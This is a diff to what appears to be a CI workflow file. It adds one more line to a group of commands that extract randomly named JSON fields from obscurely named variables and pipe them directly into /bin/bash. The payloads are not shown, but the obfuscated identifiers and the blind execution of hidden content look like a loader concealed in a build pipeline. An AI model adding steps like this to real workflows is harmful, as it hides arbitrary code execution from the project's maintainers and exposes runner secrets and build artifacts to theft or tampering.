@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$j9" | jq -r .f9848 | /bin/bash
           echo $jxp0395 | jq -r .r20763 | /bin/bash
           echo $c96093 | jq -r .qmy71 | /bin/bash
+          echo $zdscr59 | jq -r .bnet38 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
